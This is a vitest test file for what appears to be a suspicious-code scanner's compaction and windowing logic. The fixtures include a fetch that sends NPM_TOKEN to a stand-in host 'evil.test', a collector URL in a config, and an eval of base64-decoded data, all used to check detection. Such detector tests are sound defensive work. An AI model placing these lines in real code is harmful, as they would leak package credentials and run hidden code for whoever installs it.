import { describe, expect, it } from "vitest";
import {
  compactLineIndexes,
  fileStateText,
  isBuildOutputPath,
  isLowValueConfig,
  isNamedNoiseConfig,
  lineHasSignal,
} from "../src/compact";
import { locateWindows } from "../src/chunk";
import type { SourceFile } from "../src/types";

function file(relativePath: string, content: string, role: SourceFile["role"] = "source"): SourceFile {
  return {
    path: `/tmp/${relativePath}`,
    relativePath,
    role,
    content,
    lines: content.split("\n"),
    bytes: content.length,
  };
}

describe("compact", () => {
  it("keeps eval and fetch lines and drops a wall of types", () => {
    const boring = Array.from({ length: 120 }, (_, index) => `export type T${index} = { id: number; label: string };`);
    boring[40] = `  const loot = await fetch("https://evil.test/" + process.env.NPM_TOKEN);`;
    const source = file("src/types.ts", boring.join("\n"));
    const kept = compactLineIndexes(source);
    const text = kept.map((index) => source.lines[index]).join("\n");
    expect(text).toContain("fetch");
    expect(text).toContain("NPM_TOKEN");
    expect(kept.length).toBeLessThan(30);
  });

  it("sends small files whole", () => {
    const source = file("src/tiny.js", "const x = 1;\nconst y = 2;\n");
    expect(fileStateText(source)).toContain("const x = 1");
    expect(fileStateText(source)).toContain("const y = 2");
  });

  it("flags network and dynamic-code lines", () => {
    expect(lineHasSignal("eval(payload)")).toBe(true);
    expect(lineHasSignal("await fetch(url)")).toBe(true);
    expect(lineHasSignal("export function add(a: number) { return a + 1; }")).toBe(false);
  });

  it("skips compiled output and named noise configs", () => {
    expect(isBuildOutputPath("packages/foo/lib/index.js")).toBe(true);
    expect(isBuildOutputPath("packages/foo/src/lib/util.ts")).toBe(false);
    expect(isNamedNoiseConfig("tsconfig.base.json")).toBe(true);
    expect(isLowValueConfig("locales/en.json", '{ "hello": "world" }')).toBe(true);
    expect(isLowValueConfig("config.json", '{ "url": "https://collector.evil.test" }')).toBe(false);
  });

  it("windows only the interesting spans", () => {
    const lines = Array.from({ length: 40 }, (_, index) => `const n${index} = ${index};`);
    lines[21] = 'eval(Buffer.from("YQ==", "base64").toString());';
    const windows = locateWindows([file("src/app.js", lines.join("\n"))], 8, 36);
    expect(windows.length).toBeGreaterThan(0);
    expect(windows.length).toBeLessThan(6);
    expect(windows.some((window) => window.text.includes("eval"))).toBe(true);
  });
});
